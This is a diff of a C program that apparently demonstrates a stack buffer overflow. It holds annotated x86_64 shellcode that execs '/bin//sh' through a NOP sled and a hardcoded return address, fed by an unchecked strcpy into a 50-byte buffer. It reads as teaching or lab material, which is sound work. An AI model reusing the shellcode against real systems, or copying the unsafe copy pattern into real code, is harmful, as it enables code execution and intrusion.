@@ -2,52 +2,55 @@
 #include <string.h>
 #include <stdlib.h>
 
-#define MAX_SIZE 50
+#define MAX_SIZE 50     /*  buffer size in stack */
 
-char shell_code[] = {
+/*
+ *  (low)          <-----------     (high)        %rsp
+ *  ------------------------------------------------------
+ *  .....  |   varX   |   %rbp  |   %rip   |  varX | .....
+ *  ------------------------------------------------------
+ */
+
+/* X86_64 shell code */
+static char shell_code[] = {
 	0x90,0x90,0x90,0x90,0x90,0x90,           // nop
 	0x90,0x90,0x90,0x90,0x90,0x90,           // nop
 	0x90,0x90,0x90,0x90,0x90,0x90,           // nop
 	0x90,0x90,0x90,0x90,0x90,0x90,           // nop
-  	0x48,0x83,0xec,0x08,                     // sub    $0x8,%rsp
+  	0x48,0x83,0xec,0x08,                     // sub    $0x8,%rsp      --->   local var (8 bytes)
   	0x48,0xc7,0xc0,0x2f,0x62,0x69,0x6e,      // mov    $0x6e69622f,%rax 
-  	0x48,0x89,0x04,0x24,                     // mov    %rax,(%rsp)
+  	0x48,0x89,0x04,0x24,                     // mov    %rax,(%rsp)    --->   /bin
   	0x48,0xc7,0xc0,0x2f,0x2f,0x73,0x68,      // mov    $0x68732f2f,%rax
-  	0x48,0x89,0x44,0x24,0x04,                // mov    %rax,0x4(%rsp)
-  	0x31,0xd2,                               // xor    %edx,%edx
-  	0x48,0x31,0xf6,                          // xor    %rsi,%rsi
-  	0x48,0x89,0xe7,                          // mov    %rsp,%rdi
-  	0x31,0xc0,                               // xor    %eax,%eax
-  	0xb0,0x3b,                               // mov    $0x3b,%al
+  	0x48,0x89,0x44,0x24,0x04,                // mov    %rax,0x4(%rsp) --->   //sh
+  	0x31,0xd2,                               // xor    %edx,%edx      --->   arg3
+  	0x48,0x31,0xf6,                          // xor    %rsi,%rsi      --->   arg2
+  	0x48,0x89,0xe7,                          // mov    %rsp,%rdi      --->   arg1
+  	0x31,0xc0,                               // xor    %eax,%eax      --->   clear
+  	0xb0,0x3b,                               // mov    $0x3b,%al      --->   syscall number (execve function)
   	0xf3,0x0f,0x1e,0xfa,                     // endbr64
   	0x0f,0x05,                               // syscall
 	0x90,0x90,0x90,                          // nop
-	0xa0,0xde,0xff,0xff,0xff,0x7f,0x00,0x00, // rip = shellcode
+	0xa0,0xde,0xff,0xff,0xff,0x7f,0x00,0x00, // rip = shellcode address
 	};
 
 static int string_copy(char * src)
 {
-	int i;
+	volatile int size;
 	char dest[MAX_SIZE];
 
-	i = sizeof(shell_code) + *src;;
-	if(strcpy(dest, src) == NULL)
-		printf ("strcpy failed:%d\n", i);
+	size = sizeof(shell_code);
+	if (strcpy (dest, src) == NULL)
+		printf ("strcpy failed\n");
 	else 
 		printf ("strcpy success\n");
 
-	printf ("str:%s\n", dest);
+	printf ("copied size %d:%s\n", sizeof(shell_code), dest);
 
-	return i;
+	(void) dest;
+	return size;
 }
 
 int main(int argc, char *argv[])
 {
-	int i;
-
-	i = string_copy(shell_code);
-	if (i != 0)
-		return -1;
-
-	return 0;
+	return string_copy(shell_code);
 }
